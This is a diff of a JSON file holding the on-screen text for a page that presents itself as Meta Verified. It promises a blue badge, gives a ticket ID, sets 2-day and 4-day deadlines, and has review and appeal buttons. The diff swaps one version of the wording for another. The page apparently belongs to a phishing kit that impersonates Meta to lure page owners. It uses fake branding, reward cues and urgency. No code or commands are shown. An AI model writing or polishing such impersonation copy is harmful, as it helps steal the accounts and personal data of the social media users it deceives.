@@ -47,29 +47,29 @@
     },
     "content": {
         "top_content": {
-            "title": "You’re Now Eligible for Meta Verified - Earn trust. Stand out. Be verified.", 
+            "title": "Meta Verified - Rewards For You", 
             "sub": {
-                "sub_1": "Congratulations! Your Page now qualifies to apply for the Verified Blue Badge on Meta. This badge signals authenticity, builds credibility, and helps increase your visibility across Facebook and Instagram.",
-                "sub_2": "If you believe restrictions have been placed on your account in error, you can request a review."
+                "sub_1": "Congratulations on achieving the requirements to upgrade your page to a verified blue badge! This is a fantastic milestone that reflects your dedication and the trust you've built with your audience.",
+                "sub_2": "We’re thrilled to celebrate this moment with you and look forward to seeing your page thrive with this prestigious recognition!"
             },
-            "ticket": "Your Request ID:"
+            "ticket": "Your Ticket ID "
         },
         "guide": {
-            "title": "✅ Verification Request Guidelines",
+            "title": "✅ Verified Blue Badge Request Guide",
             "sub": {
-                "sub_1": "Use respectful language. Requests containing threats or hate speech will be rejected.",
-                "sub_2": "Respond to any follow-up requests within 2 days.",
-                "sub_3": "Unprocessed requests will be automatically declined after 4 days."
+                "sub_1": "- Fact checkers may not respond to requests containing intimidation, hate speech, or verbal threats",
+                "sub_2": "- In your request, please provide all required information to ensure timely processing by the fact checker. Submitting an invalid email address or failing to reply to requests for additional information within 2 days may lead to the application being closed without review. If the request remains unprocessed after 4 days, Meta will automatically reject it.",
+                "sub_3": "- Once all details are submitted, we will evaluate your account to check for any restrictions. The verification process typically takes 24 hours, though it may extend in some cases. Based on our decision, restrictions will either remain or be lifted, and your account will be updated accordingly."
             }
         },
         "thumb": {
-            "title": "Review Process & Policy Compliance Check",
+            "title": "Verification Review",
             "sub": {
                 "sub_1": "Review request",
                 "sub_2": "Processing typically takes 24–48 hours. Your account will be reviewed for any policy restrictions."
             },
-            "button": "Request Review",
-            "day": "Your page was restricted on"
+            "button": "Submit request",
+            "day": "You were verified on"
         },
         "appeal_guide": {
             "title": "Appeal Guide",
